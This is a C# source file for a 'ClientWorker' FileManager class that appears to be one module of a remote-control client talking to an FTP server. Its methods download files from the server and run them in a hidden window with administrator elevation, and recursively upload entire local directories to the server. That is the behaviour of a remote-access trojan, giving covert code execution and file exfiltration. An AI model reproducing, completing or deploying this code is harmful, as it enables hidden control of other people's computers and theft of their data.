using System;
using System.Diagnostics;
using System.IO;

namespace ClientWorker
{
    public static class FileManager
    {
        public static void DownloadFloader(string floader, string localPath)
        {
            Log.Send("DownloadFloader("+ floader + ","+ localPath+")");
            FtpClient.DownloadFtpDirectory("ftp://" + StartData.currentServer + "/" + floader, localPath);
        }

        public static void RunHideProc(string fileName)
        {
            Log.Send("RunHideProc");
            try
            {
                new Process
                {
                    StartInfo =
                    {
                        FileName = fileName,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas",
            }
                }.Start();
            }
            catch (Exception ex)
            {
                Log.Send("RunHideProc failed: " + ex.ToString());
            }
        }

        public static void DownloadFileAndRun(string fileName)
        {
            Log.Send("DownloadFileAndRun");
            try
            {
                FtpClient.DownloadF(fileName);
                RunHideProc(fileName);
            }
            catch (Exception ex)
            {
                Log.Send("Exception DownloadFileAndRun: " + ex.Message);
            }
        }

        public static void DeleteFile(string parth)
        {
            try
            {
                File.Delete(parth);
            }
            catch (Exception ex)
            {
                Log.Send("Ошибка удаления файла: " + ex.Message);
            }
        }

        public static void UploadDirectory(string dirPath, string uploadPath)
        {
            if (File.Exists(dirPath))
            {
                FtpClient.UploadF(uploadPath + "/" + Path.GetFileName(dirPath), dirPath);
                return;
            }
            string[] files = Directory.GetFiles(dirPath, "*.*");
            string[] subDirs = Directory.GetDirectories(dirPath);

            foreach (string file in files)
            {
                FtpClient.UploadF(uploadPath + "/" + Path.GetFileName(file), file);
            }

            foreach (string subDir in subDirs)
            {
                FtpClient.CreateDirectory(uploadPath + "/" + Path.GetFileName(subDir));
                UploadDirectory(subDir, uploadPath + "/" + Path.GetFileName(subDir));
            }
        }

        public static void Download(string FileName, string localPath)
        {
            if (FtpClient.FtpDirectoryExists(FileName))
            {
                FileManager.DownloadFloader(FileName, localPath);
            }
            else
            {
                FtpClient.DownloadF(FileName, localPath);
            }
        }
    }
}
